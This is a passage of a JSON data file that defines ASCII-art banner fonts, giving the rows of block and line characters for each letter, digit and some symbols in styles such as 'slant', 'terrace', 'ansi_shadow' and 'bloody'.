        ],
        "Q": [
            "▄▀▄",
            "█ █",
            "▀▀█"
        ],
        "R": [
            "█▀▄",
            "█▀▄",
            "▀ ▀"
        ],
        "S": [
            "▄▀▀",
            "▀▀▄",
            "▀▀▀"
        ],
        "T": [
            "▀█▀",
            " █ ",
            " ▀ "
        ],
        "U": [
            "█ █",
            "█ █",
            "▀▀▀"
        ],
        "V": [
            "█ █",
            "█ █",
            "▀▀ "
        ],
        "W": [
            "█ █",
            "█▄█",
            "▀ ▀"
        ],
        "X": [
            "▀▄▀",
            " █ ",
            "▀ ▀"
        ],
        "Y": [
            "█ █",
            "▀█▀",
            " ▀ "
        ],
        "Z": [
            "▀▀█",
            " ▄▀",
            "█▀▀"
        ]
    },
    "big_money_ne": {
        "0": [
            " /--\\ ",
            "| /  |",
            "|/   |",
            " \\__/ ",
            "      ",
            "      "
        ],
        "1": [
            "  /|  ",
            " / |  ",
            "   |  ",
            " -----",
            "      ",
            "      "
        ],
        "2": [
            " /--\\ ",
            "    / ",
            "   /  ",
            " -----",
            "      ",
            "      "
        ],
        "3": [
            "----\\ ",
            "   _/ ",
            "   _\\ ",
            "____/ ",
            "      ",
            "      "
        ],
        "4": [
            "  /|  ",
            " /_|__",
            "   |  ",
            "   |  ",
            "      ",
            "      "
        ],
        "5": [
            "----- ",
            "|___  ",
            "    \\ ",
            "____/ ",
            "      ",
            "      "
        ],
        "6": [
            " /--  ",
            "| __  ",
            "|   | ",
            " \\__/ ",
            "      ",
            "      "
        ],
        "7": [
            "----- ",
            "   /  ",
            "  /   ",
            " /    ",
            "      ",
            "      "
        ],
        "8": [
            " /--\\ ",
            " \\__/ ",
            " /  \\ ",
            " \\__/ ",
            "      ",
            "      "
        ],
        "9": [
            " /--\\ ",
            "|  __|",
            " \\__\\ ",
            "    / ",
            "      ",
            "      "
        ],
        " ": [
            "      ",
            "      ",
            "      ",
            "      ",
            "      ",
            "      "
        ],
        "A": [
            "  /\\  ",
            " /  \\ ",
            "/ /\\ \\",
            "\\/  \\/",
            "      ",
            "      "
        ],
        "B": [
            "/---\\ ",
            "| __| ",
            "|  _| ",
            "\\___/ ",
            "      ",
            "      "
        ],
        "C": [
            " /--\\ ",
            "| |   ",
            "| |__ ",
            " \\__/ ",
            "      ",
            "      "
        ],
        "D": [
            "|---\\ ",
            "|   | ",
            "|   | ",
            "|___/ ",
            "      ",
            "      "
        ],
        "E": [
            "|---| ",
            "| |_  ",
            "|  _| ",
            "|___| ",
            "      ",
            "      "
        ],
        "F": [
            "|---| ",
            "| |_  ",
            "|  _| ",
            "|_|   ",
            "      ",
            "      "
        ],
        "G": [
            " /--\\ ",
            "| |   ",
            "| | | ",
            " \\__\\ ",
            "      ",
            "      "
        ],
        "H": [
            "|   | ",
            "|___| ",
            "|   | ",
            "|   | ",
            "      ",
            "      "
        ],
        "I": [
            " ---  ",
            "  |   ",
            "  |   ",
            " ---  ",
            "      ",
            "      "
        ],
        "J": [
            " ---- ",
            "   |  ",
            "   |  ",
            "\\__/  ",
            "      ",
            "      "
        ],
        "K": [
            "|  /  ",
            "|_/   ",
            "| \\   ",
            "|  \\  ",
            "      ",
            "      "
        ],
        "L": [
            "|     ",
            "|     ",
            "|     ",
            "|___  ",
            "      ",
            "      "
        ],
        "M": [
            "|\\/|  ",
            "|  |  ",
            "|  |  ",
            "|  |  ",
            "      ",
            "      "
        ],
        "N": [
            "|\\ |  ",
            "| \\|  ",
            "|  |  ",
            "|  |  ",
            "      ",
            "      "
        ],
        "O": [
            " /--\\ ",
            "|    |",
            "|    |",
            " \\__/ ",
            "      ",
            "      "
        ],
        "P": [
            "|---\\ ",
            "|___/ ",
            "|     ",
            "|     ",
            "      ",
            "      "
        ],
        "Q": [
            " /--\\ ",
            "|    |",
            "|  \\ |",
            " \\__\\|",
            "      ",
            "      "
        ],
        "R": [
            "|---\\ ",
            "|___/ ",
            "|  \\  ",
            "|   \\ ",
            "      ",
            "      "
        ],
        "S": [
            " /--\\ ",
            " \\__\\ ",
            "    | ",
            " \\__/ ",
            "      ",
            "      "
        ],
        "T": [
            "----- ",
            "  |   ",
            "  |   ",
            "  |   ",
            "      ",
            "      "
        ],
        "U": [
            "|   | ",
            "|   | ",
            "|   | ",
            " \\__/ ",
            "      ",
            "      "
        ],
        "V": [
            "\\   / ",
            " \\ /  ",
            "  V   ",
            "  V   ",
            "      ",
            "      "
        ],
        "W": [
            "|   | ",
            "| | | ",
            "|_|_| ",
            "      ",
            "      ",
            "      "
        ],
        "X": [
            "\\   / ",
            " > <  ",
            "/   \\ ",
            "      ",
            "      ",
            "      "
        ],
        "Y": [
            "\\   / ",
            " \\ /  ",
            "  |   ",
            "  |   ",
            "      ",
            "      "
        ],
        "Z": [
            "----- ",
            "   /  ",
            "  /   ",
            "----- ",
            "      ",
            "      "
        ]
    },
    "miniwi": {
        "0": [
            "()  ",
            "()  ",
            "    "
        ],
        "1": [
            "/|  ",
            " |  ",
            "    "
        ],
        "2": [
            "_)  ",
            "/_  ",
            "    "
        ],
        "3": [
            "_)  ",
            "_)  ",
            "    "
        ],
        "4": [
            "|_| ",
            "  | ",
            "    "
        ],
        "5": [
            "|_  ",
            "_)  ",
            "    "
        ],
        "6": [
            "/   ",
            "(_  ",
            "    "
        ],
        "7": [
            "--/ ",
            " /  ",
            "    "
        ],
        "8": [
            "( ) ",
            "(_) ",
            "    "
        ],
        "9": [
            "(_) ",
            "  / ",
            "    "
        ],
        " ": [
            "  ",
            "  ",
            "  "
        ],
        "A": [
            " /\\ ",
            "/--\\",
            "    "
        ],
        "B": [
            "|-) ",
            "|_) ",
            "    "
        ],
        "C": [
            "/`  ",
            "\\_, ",
            "    "
        ],
        "D": [
            "|\\  ",
            "|/  ",
            "    "
        ],
        "E": [
            "|-- ",
            "|__ ",
            "    "
        ],
        "F": [
            "|-- ",
            "|   ",
            "    "
        ],
        "G": [
            "/`  ",
            "\\_\\ ",
            "    "
        ],
        "H": [
            "|-| ",
            "| | ",
            "    "
        ],
        "I": [
            " |  ",
            " |  ",
            "    "
        ],
        "J": [
            " |  ",
            "_/  ",
            "    "
        ],
        "K": [
            "|/  ",
            "|\\  ",
            "    "
        ],
        "L": [
            "|   ",
            "|_  ",
            "    "
        ],
        "M": [
            "|V| ",
            "| | ",
            "    "
        ],
        "N": [
            "|\\| ",
            "| | ",
            "    "
        ],
        "O": [
            "( ) ",
            "(_) ",
            "    "
        ],
        "P": [
            "|-) ",
            "|   ",
            "    "
        ],
        "Q": [
            "( ) ",
            "(_\\ ",
            "    "
        ],
        "R": [
            "|-) ",
            "|\\  ",
            "    "
        ],
        "S": [
            "_   ",
            "_)  ",
            "    "
        ],
        "T": [
            "-+- ",
            " |  ",
            "    "
        ],
        "U": [
            "| | ",
            "|_| ",
            "    "
        ],
        "V": [
            "\\ / ",
            " V  ",
            "    "
        ],
        "W": [
            "\\ / ",
            " W  ",
            "    "
        ],
        "X": [
            "><  ",
            "><  ",
            "    "
        ],
        "Y": [
            "\\/  ",
            "/   ",
            "    "
        ],
        "Z": [
            "-/. ",
            "/_. ",
            "    "
        ]
    },
    "slant": {
        "0": [
            "   ___  ",
            "  / _ \\ ",
            " / // / ",
            " \\___/  "
        ],
        "1": [
            "   ___",
            "  <  /",
            "  / / ",
            " /_/  "
        ],
        "2": [
            "   ___ ",
            "  |__ \\",
            "  __/ /",
            " /____/"
        ],
        "3": [
            "  ____",
            " /_  /",
            "  _ < ",
            "/____/"
        ],
        "4": [
            "   __ __",
            "  / // /",
            " / // /_",
            "/__  __/"
        ],
        "5": [
            "    ______",
            "   / ____/",
            "  /___ \\  ",
            " /_____/  "
        ],
        "6": [
            "   _____",
            "  / ___/",
            " / __ \\ ",
            "/____/  "
        ],
        "7": [
            "  __  ",
            " / /  ",
            "/ /   ",
            "/_/   "
        ],
        "8": [
            "   ___ ",
            "  ( _ )",
            " / _ \\ ",
            " \\___/ "
        ],
        "9": [
            "   ____ ",
            "  / __ \\",
            " / /_/ /",
            " \\____/ "
        ],
        " ": [
            "    ",
            "    ",
            "    ",
            "    "
        ],
        "A": [
            "   /\\  ",
            "  /  \\ ",
            " / /\\ \\",
            "/_/  \\_\\"
        ],
        "B": [
            "    __ ",
            "   /  )",
            "  /  < ",
            " /___/ "
        ],
        "C": [
            "   ______",
            "  / ____/",
            " / /___  ",
            "/_____/  "
        ],
        "D": [
            "    __ ",
            "   /  \\",
            "  /   /",
            " /___/ "
        ],
        "E": [
            "    ______",
            "   / ____/",
            "  / __/   ",
            " /_____/  "
        ],
        "F": [
            "    ______",
            "   / ____/",
            "  / /_    ",
            " /_/      "
        ],
        "G": [
            "   ______",
            "  / ____/",
            " / /_ __ ",
            "/_____/_/"
        ],
        "H": [
            "    __  __",
            "   / / / /",
            "  / /_/ / ",
            " /_  __/  "
        ],
        "I": [
            "    __",
            "   / /",
            "  / / ",
            " /_/  "
        ],
        "J": [
            "       __",
            "      / /",
            " __  / / ",
            "/____/   "
        ],
        "K": [
            "    __ __",
            "   / //_/",
            "  / ,<   ",
            " /_/|_|  "
        ],
        "L": [
            "    __   ",
            "   / /   ",
            "  / /___ ",
            " /_____/ "
        ],
        "M": [
            "    __  ___",
            "   /  |/  /",
            "  / /|_/ / ",
            " /_/  /_/  "
        ],
        "N": [
            "    _  __",
            "   / |/ /",
            "  /    / ",
            " /_/|_/  "
        ],
        "O": [
            "   ____ ",
            "  / __ \\",
            " / /_/ /",
            " \\____/ "
        ],
        "P": [
            "    ____ ",
            "   / __ \\",
            "  / /_/ /",
            " / ____/ "
        ],
        "Q": [
            "   ____ ",
            "  / __ \\",
            " / /_/ /",
            " \\___\\_\\"
        ],
        "R": [
            "    ____ ",
            "   / __ \\",
            "  / /_/ /",
            " /_  _ \\ "
        ],
        "S": [
            "   _____",
            "  / ___/",
            " (__  ) ",
            "/____/  "
        ],
        "T": [
            "  ______",
            " /_  __/",
            "  / /   ",
            " /_/    "
        ],
        "U": [
            "   __  __",
            "  / / / /",
            " / /_/ / ",
            " \\____/  "
        ],
        "V": [
            "   _  __",
            "  | |/ /",
            "  |   / ",
            "  |__/  "
        ],
        "W": [
            "   _       __",
            "  | |     / /",
            "  | | /| / / ",
            "  | |/ |/ /  "
        ],
        "X": [
            "   _  __",
            "  | |/ /",
            "  |   < ",
            "  |/|/| "
        ],
        "Y": [
            "   __  __",
            "   \\ \\/ /",
            "    \\  / ",
            "    /_/  "
        ],
        "Z": [
            "  ______",
            " /_  __/",
            "  / /_  ",
            " /___/  "
        ]
    },
    "terrace": {
        "0": [
            "  _  ",
            " / \\ ",
            "( 0 )",
            " \\_/ ",
            "     "
        ],
        "1": [
            "  _  ",
            " /_) ",
            " (_) ",
            " (_) ",
            "     "
        ],
        "2": [
            " ___ ",
            "(__ )",
            " ( / ",
            "(___)",
            "     "
        ],
        "3": [
            " ___ ",
            "(__ )",
            " __) ",
            "(___)",
            "     "
        ],
        "4": [
            " _ _ ",
            "(_| )",
            "  | |",
            "  |_|",
            "     "
        ],
        "5": [
            " ___ ",
            "(___)",
            " __) ",
            "(___)",
            "     "
        ],
        "6": [
            "  _  ",
            " /   ",
            "( 6 )",
            " \\_/ ",
            "     "
        ],
        "7": [
            " ___ ",
            "(__ )",
            "  /  ",
            " /   ",
            "     "
        ],
        "8": [
            "  _  ",
            " (8) ",
            " (8) ",
            " \\_/ ",
            "     "
        ],
        "9": [
            "  _  ",
            " (9) ",
            "   ) ",
            " \\_/ ",
            "     "
        ],
        " ": [
            "     ",
            "     ",
            "     ",
            "     ",
            "     "
        ],
        "A": [
            "  _  ",
            " / \\ ",
            "( A )",
            " \\_/ ",
            "     "
        ],
        "B": [
            " __  ",
            "(  ) ",
            " ) ( ",
            "(__) ",
            "     "
        ],
        "C": [
            "  _  ",
            " / \\ ",
            "(   )",
            " \\_/ ",
            "     "
        ],
        "D": [
            " __  ",
            "(  \\ ",
            " )  )",
            "(__/ ",
            "     "
        ],
        "E": [
            " ___ ",
            "(___)",
            "( __)",
            "(___)",
            "     "
        ],
        "F": [
            " ___ ",
            "(___)",
            "( __)",
            "(_)  ",
            "     "
        ],
        "G": [
            "  _  ",
            " / \\ ",
            "( G )",
            " \\_/ ",
            "     "
        ],
        "H": [
            " _ _ ",
            "(_) )",
            "(  ( ",
            "(_|_) ",
            "     "
        ],
        "I": [
            "  _  ",
            " (_) ",
            " (_) ",
            " (_) ",
            "     "
        ],
        "J": [
            "   _ ",
            "  (_)",
            "  (_)",
            "(_(_)",
            "     "
        ],
        "K": [
            " _ _ ",
            "(_) )",
            "(  ( ",
            "(_(_) ",
            "     "
        ],
        "L": [
            " _   ",
            "(_)  ",
            "(_)  ",
            "(___)",
            "     "
        ],
        "M": [
            " _ _ ",
            "( V )",
            "(   )",
            "(_|_) ",
            "     "
        ],
        "N": [
            " _ _ ",
            "( \\ )",
            "(  \\)",
            "(_|_) ",
            "     "
        ],
        "O": [
            "  _  ",
            " / \\ ",
            "( O )",
            " \\_/ ",
            "     "
        ],
        "P": [
            " ___ ",
            "(_  )",
            "(_ _) ",
            "(_)   ",
            "     "
        ],
        "Q": [
            "  _  ",
            " / \\ ",
            "( Q )",
            " \\_\\ ",
            "     "
        ],
        "R": [
            " ___ ",
            "(_  )",
            "(_ _)",
            "(_| \\",
            "     "
        ],
        "S": [
            "  _  ",
            " (_  ",
            " __) ",
            "(___)",
            "     "
        ],
        "T": [
            " ___ ",
            "(_ _)",
            " (_) ",
            " (_) ",
            "     "
        ],
        "U": [
            " _ _ ",
            "(_) )",
            "(  ( ",
            "(___)",
            "     "
        ],
        "V": [
            " _ _ ",
            "(_) )",
            "( V )",
            " (_) ",
            "     "
        ],
        "W": [
            " _ _ ",
            "(_) )",
            "( W )",
            "(_|_)",
            "     "
        ],
        "X": [
            " _ _ ",
            "( X )",
            " ) ( ",
            "(_|_)",
            "     "
        ],
        "Y": [
            " _ _ ",
            "( Y )",
            " ) ( ",
            " (_) ",
            "     "
        ],
        "Z": [
            " ___ ",
            "(__ )",
            " ( / ",
            "(___)",
            "     "
        ]
    },
    "ansi_shadow": {
        "0": [
            "  ██████╗ ",
            " ██╔═████╗",
            " ██║██╔██║",
            " ████╔╝██║",
            " ╚██████╔╝",
            "  ╚═════╝ "
        ],
        "1": [
            "  ██╗",
            " ███║",
            " ╚██║",
            "  ██║",
            "  ██║",
            "  ╚═╝"
        ],
        "2": [
            " ██████╗ ",
            " ╚════██╗",
            "  █████╔╝",
            " ██╔═══╝ ",
            " ███████╗",
            " ╚══════╝"
        ],
        "3": [
            " ██████╗ ",
            " ╚════██╗",
            "  █████╔╝",
            " ╚════██╗",
            " ██████╔╝",
            " ╚═════╝ "
        ],
        "4": [
            " ██╗  ██╗",
            " ██║  ██║",
            " ███████║",
            " ╚════██║",
            "      ██║",
            "      ╚═╝"
        ],
        "5": [
            " ███████╗",
            " ██╔════╝",
            " ███████╗",
            " ╚════██║",
            " ███████║",
            " ╚══════╝"
        ],
        "6": [
            "  ██████╗ ",
            " ██╔════╝ ",
            " ███████╗ ",
            " ██╔═══██╗",
            " ╚██████╔╝",
            "  ╚═════╝ "
        ],
        "7": [
            " ████████╗",
            " ╚══════██╗",
            "      ██╔╝",
            "     ██╔╝ ",
            "    ██╔╝  ",
            "    ╚═╝   "
        ],
        "8": [
            "  ██████╗ ",
            " ██╔═══██╗",
            " ╚██████╔╝",
            "  ██╔══██╗",
            "  ╚██████╔╝",
            "   ╚═════╝ "
        ],
        "9": [
            "  ██████╗ ",
            " ██╔═══██╗",
            " ╚███████╗",
            "  ╚════██║",
            " ███████╔╝",
            " ╚══════╝ "
        ],
        " ": [
            "        ",
            "        ",
            "        ",
            "        ",
            "        ",
            "        "
        ],
        "A": [
            "  █████╗ ",
            " ██╔══██╗",
            " ███████║",
            " ██╔══██║",
            " ██║  ██║",
            " ╚═╝  ╚═╝"
        ],
        "B": [
            " ██████╗ ",
            " ██╔══██╗",
            " ██████╔╝",
            " ██╔══██╗",
            " ██████╔╝",
            " ╚═════╝ "
        ],
        "C": [
            "  ██████╗",
            " ██╔════╝",
            " ██║     ",
            " ██║     ",
            " ╚██████╗",
            "  ╚═════╝"
        ],
        "D": [
            " ██████╗ ",
            " ██╔══██╗",
            " ██║  ██║",
            " ██║  ██║",
            " ██████╔╝",
            " ╚═════╝ "
        ],
        "E": [
            " ██████╗ ",
            " ██╔════╝",
            " █████╗  ",
            " ██╔══╝  ",
            " ██████╗ ",
            " ╚═════╝ "
        ],
        "F": [
            " ██████╗ ",
            " ██╔════╝",
            " █████╗  ",
            " ██╔══╝  ",
            " ██║     ",
            " ╚═╝     "
        ],
        "G": [
            "  ██████╗",
            " ██╔════╝",
            " ██║  ███╗",
            " ██║   ██║",
            " ╚██████╔╝",
            "  ╚═════╝ "
        ],
        "H": [
            " ██╗  ██╗",
            " ██║  ██║",
            " ███████║",
            " ██║  ██║",
            " ██║  ██║",
            " ╚═╝  ╚═╝"
        ],
        "I": [
            " ██╗",
            " ██║",
            " ██║",
            " ██║",
            " ██║",
            " ╚═╝"
        ],
        "J": [
            "      ██╗",
            "      ██║",
            "      ██║",
            " ██   ██║",
            " ╚█████╔╝",
            "  ╚════╝ "
        ],
        "K": [
            " ██╗  ██╗",
            " ██║ ██╔╝",
            " █████╔╝ ",
            " ██╔═██╗ ",
            " ██║  ██╗",
            " ╚═╝  ╚═╝"
        ],
        "L": [
            " ██╗     ",
            " ██║     ",
            " ██║     ",
            " ██║     ",
            " ███████╗",
            " ╚══════╝"
        ],
        "M": [
            " ███╗   ███╗",
            " ████╗ ████║",
            " ██╔████╔██║",
            " ██║╚██╔╝██║",
            " ██║ ╚═╝ ██║",
            " ╚═╝     ╚═╝"
        ],
        "N": [
            " ███╗   ██╗",
            " ████╗  ██║",
            " ██╔██╗ ██║",
            " ██║╚██╗██║",
            " ██║ ╚████║",
            " ╚═╝  ╚═══╝"
        ],
        "O": [
            "  ██████╗ ",
            " ██╔═══██╗",
            " ██║   ██║",
            " ██║   ██║",
            " ╚██████╔╝",
            "  ╚═════╝ "
        ],
        "P": [
            " ██████╗ ",
            " ██╔══██╗",
            " ██████╔╝",
            " ██╔═══╝ ",
            " ██║     ",
            " ╚═╝     "
        ],
        "Q": [
            "  ██████╗ ",
            " ██╔═══██╗",
            " ██║   ██║",
            " ██║▄▄ ██║",
            " ╚██████╔╝",
            "  ╚══▀▀═╝ "
        ],
        "R": [
            " ██████╗ ",
            " ██╔══██╗",
            " ██████╔╝",
            " ██╔══██╗",
            " ██║  ██║",
            " ╚═╝  ╚═╝"
        ],
        "S": [
            " ███████╗",
            " ██╔════╝",
            " ███████╗",
            " ╚════██║",
            " ███████║",
            " ╚══════╝"
        ],
        "T": [
            " ████████╗",
            " ╚══██╔══╝",
            "    ██║   ",
            "    ██║   ",
            "    ██║   ",
            "    ╚═╝   "
        ],
        "U": [
            " ██╗  ██╗",
            " ██║  ██║",
            " ██║  ██║",
            " ██║  ██║",
            " ╚█████╔╝",
            "  ╚════╝ "
        ],
        "V": [
            " ██╗   ██╗",
            " ██║   ██║",
            " ██║   ██║",
            " ╚██╗ ██╔╝",
            "  ╚████╔╝ ",
            "   ╚═══╝  "
        ],
        "W": [
            " ██╗    ██╗",
            " ██║    ██║",
            " ██║ █╗ ██║",
            " ██║███╗██║",
            " ╚███╔███╔╝",
            "  ╚══╝╚══╝ "
        ],
        "X": [
            " ██╗  ██╗",
            " ╚██╗██╔╝",
            "  ╚███╔╝ ",
            "  ██╔██╗ ",
            " ██╔╝ ██╗",
            " ╚═╝  ╚═╝"
        ],
        "Y": [
            " ██╗   ██╗",
            " ╚██╗ ██╔╝",
            "  ╚████╔╝ ",
            "   ╚██╔╝  ",
            "    ██║   ",
            "    ╚═╝   "
        ],
        "Z": [
            " ███████╗",
            " ╚══███╔╝",
            "   ███╔╝ ",
            "  ███╔╝  ",
            " ███████╗",
            " ╚══════╝"
        ]
    },
    "bloody": {
        "0": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "1": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "2": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "3": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "4": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "5": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "6": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "7": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "8": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "9": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        " ": [
            "$ $",
            "$ $",
            "$ $",
            "$ $",
            "$ $",
            "$ $",
            "$ $",
            "$ $",
            "$ $",
            "$ $"
        ],
        "!": [
            "$▐██▌$",
            "$▐██▌$",
            "$▐██▌$",
            "$▓██▒$",
            "$▒▄▄ $",
            "$░▀▀▒$",
            "$░  ░$",
            "$   ░$",
            "$░   $",
            "$    $"
        ],
        "\"": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "#": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "$": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "%": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "&": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "'": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "(": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        ")": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "*": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "+": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        ",": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "-": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        ".": [
            "$   $",
            "$   $",
            "$   $",
            "$   $",
            "$██▓$",
            "$▒▓▒$",
            "$░▒ $",
            "$░  $",
            "$ ░ $",
            "$ ░ $"
        ],
        "/": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        ":": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        ";": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "<": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "=": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        ">": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "?": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "@": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "A": [
            " ▄▄▄      ",
            "▒████▄    ",
            "▒██  ▀█▄  ",
            "░██▄▄▄▄██ ",
            " ▓█   ▓██▒",
            " ▒▒   ▓▒█░",
            "  ▒   ▒▒ ░",
            "  ░   ▒   ",
            "      ░  ░",
            "          "
        ],
        "B": [
            " ▄▄▄▄   ",
            "▓█████▄ ",
            "▒██▒ ▄██",
            "▒██░█▀  ",
            "░▓█  ▀█▓",
            "░▒▓███▀▒",
            "▒░▒   ░ ",
            " ░    ░ ",
            " ░      ",
            "      ░ "
        ],
        "C": [
            " ▄████▄  ",
            "▒██▀ ▀█  ",
            "▒▓█    ▄ ",
            "▒▓▓▄ ▄██▒",
            "▒ ▓███▀ ░",
            "░ ░▒ ▒  ░",
            "  ░  ▒   ",
            "░        ",
            "░ ░      ",
            "░        "
        ],
        "D": [
            "▓█████▄ ",
            "▒██▀ ██▌",
            "░██   █▌",
            "░▓█▄   ▌",
            "░▒████▓ ",
            " ▒▒▓  ▒ ",
            " ░ ▒  ▒ ",
            " ░ ░  ░ ",
            "   ░    ",
            " ░      "
        ],
        "E": [
            "▓█████ ",
            "▓█   ▀ ",
            "▒███   ",
            "▒▓█  ▄ ",
            "░▒████▒",
            "░░ ▒░ ░",
            " ░ ░  ░",
            "   ░   ",
            "   ░  ░",
            "       "
        ],
        "F": [
            "  █████▒",
            "▓██   ▒ ",
            "▒████ ░ ",
            "░▓█▒  ░ ",
            "░▒█░    ",
            " ▒ ░    ",
            " ░      ",
            " ░ ░    ",
            "        ",
            "        "
        ],
        "G": [
            "  ▄████ ",
            " ██▒ ▀█▒",
            "▒██░▄▄▄░",
            "░▓█  ██▓",
            "░▒▓███▀▒",
            " ░▒   ▒ ",
            "  ░   ░ ",
            "░ ░   ░ ",
            "      ░ ",
            "        "
        ],
        "H": [
            " ██░ ██ ",
            "▓██░ ██▒",
            "▒██▀▀██░",
            "░▓█ ░██ ",
            "░▓█▒░██▓",
            " ▒ ░░▒░▒",
            " ▒ ░▒░ ░",
            " ░  ░░ ░",
            " ░  ░  ░",
            "        "
        ],
        "I": [
            " ██▓",
            "▓██▒",
            "▒██▒",
            "░██░",
            "░██░",
            "░▓  ",
            " ▒ ░",
            " ▒ ░",
            " ░  ",
            "    "
        ],
        "J": [
            " ▄▄▄██▀▀▀",
            "   ▒██   ",
            "   ░██   ",
            "▓██▄██▓  ",
            " ▓███▒   ",
            " ▒▓▒▒░   ",
            " ▒ ░▒░   ",
            " ░ ░ ░   ",
            " ░   ░   ",
            "         "
        ],
        "K": [
            " ██ ▄█▀",
            " ██▄█▒ ",
            "▓███▄░ ",
            "▓██ █▄ ",
            "▒██▒ █▄",
            "▒ ▒▒ ▓▒",
            "░ ░▒ ▒░",
            "░ ░░ ░ ",
            "░  ░   ",
            "       "
        ],
        "L": [
            " ██▓    ",
            "▓██▒    ",
            "▒██░    ",
            "▒██░    ",
            "░██████▒",
            "░ ▒░▓  ░",
            "░ ░ ▒  ░",
            "  ░ ░   ",
            "    ░  ░",
            "        "
        ],
        "M": [
            " ███▄ ▄███▓",
            "▓██▒▀█▀ ██▒",
            "▓██    ▓██░",
            "▒██    ▒██ ",
            "▒██▒   ░██▒",
            "░ ▒░   ░  ░",
            "░  ░      ░",
            "░      ░   ",
            "       ░   ",
            "           "
        ],
        "N": [
            " ███▄    █ ",
            " ██ ▀█   █ ",
            "▓██  ▀█ ██▒",
            "▓██▒  ▐▌██▒",
            "▒██░   ▓██░",
            "░ ▒░   ▒ ▒ ",
            "░ ░░   ░ ▒░",
            "   ░   ░ ░ ",
            "         ░ ",
            "           "
        ],
        "O": [
            " ▒█████  ",
            "▒██▒  ██▒",
            "▒██░  ██▒",
            "▒██   ██░",
            "░ ████▓▒░",
            "░ ▒░▒░▒░ ",
            "  ░ ▒ ▒░ ",
            "░ ░ ░ ▒  ",
            "    ░ ░  ",
            "         "
        ],
        "P": [
            " ██▓███  ",
            "▓██░  ██▒",
            "▓██░ ██▓▒",
            "▒██▄█▓▒ ▒",
            "▒██▒ ░  ░",
            "▒▓▒░ ░  ░",
            "░▒ ░     ",
            "░░       ",
            "         ",
            "         "
        ],
        "Q": [
            "  █████  ",
            "▒██▓  ██▒",
            "▒██▒  ██░",
            "░██  █▀ ░",
            "░▒███▒█▄ ",
            "░░ ▒▒░ ▒ ",
            " ░ ▒░  ░ ",
            "   ░   ░ ",
            "    ░    ",
            "         "
        ],
        "R": [
            " ██▀███  ",
            "▓██ ▒ ██▒",
            "▓██ ░▄█ ▒",
            "▒██▀▀█▄  ",
            "░██▓ ▒██▒",
            "░ ▒▓ ░▒▓░",
            "  ░▒ ░ ▒░",
            "  ░░   ░ ",
            "   ░     ",
            "         "
        ],
        "S": [
            "  ██████ ",
            "▒██    ▒ ",
            "░ ▓██▄   ",
            "  ▒   ██▒",
            "▒██████▒▒",
            "▒ ▒▓▒ ▒ ░",
            "░ ░▒  ░ ░",
            "░  ░  ░  ",
            "      ░  ",
            "         "
        ],
        "T": [
            "▄▄▄█████▓",
            "▓  ██▒ ▓▒",
            "▒ ▓██░ ▒░",
            "░ ▓██▓ ░ ",
            "  ▒██▒ ░ ",
            "  ▒ ░░   ",
            "    ░    ",
            "  ░      ",
            "         ",
            "         "
        ],
        "U": [
            " █    ██ ",
            " ██  ▓██▒",
            "▓██  ▒██░",
            "▓▓█  ░██░",
            "▒▒█████▓ ",
            "░▒▓▒ ▒ ▒ ",
            "░░▒░ ░ ░ ",
            " ░░░ ░ ░ ",
            "   ░     ",
            "         "
        ],
        "V": [
            " ██▒   █▓",
            "▓██░   █▒",
            " ▓██  █▒░",
            "  ▒██ █░░",
            "   ▒▀█░  ",
            "   ░ ▐░  ",
            "   ░ ░░  ",
            "     ░░  ",
            "      ░  ",
            "     ░   "
        ],
        "W": [
            " █     █░",
            "▓█░ █ ░█░",
            "▒█░ █ ░█ ",
            "░█░ █ ░█ ",
            "░░██▒██▓ ",
            "░ ▓░▒ ▒  ",
            "  ▒ ░ ░  ",
            "  ░   ░  ",
            "    ░    ",
            "         "
        ],
        "X": [
            "▒██   ██▒",
            "▒▒ █ █ ▒░",
            "░░  █   ░",
            " ░ █ █ ▒ ",
            "▒██▒ ▒██▒",
            "▒▒ ░ ░▓ ░",
            "░░   ░▒ ░",
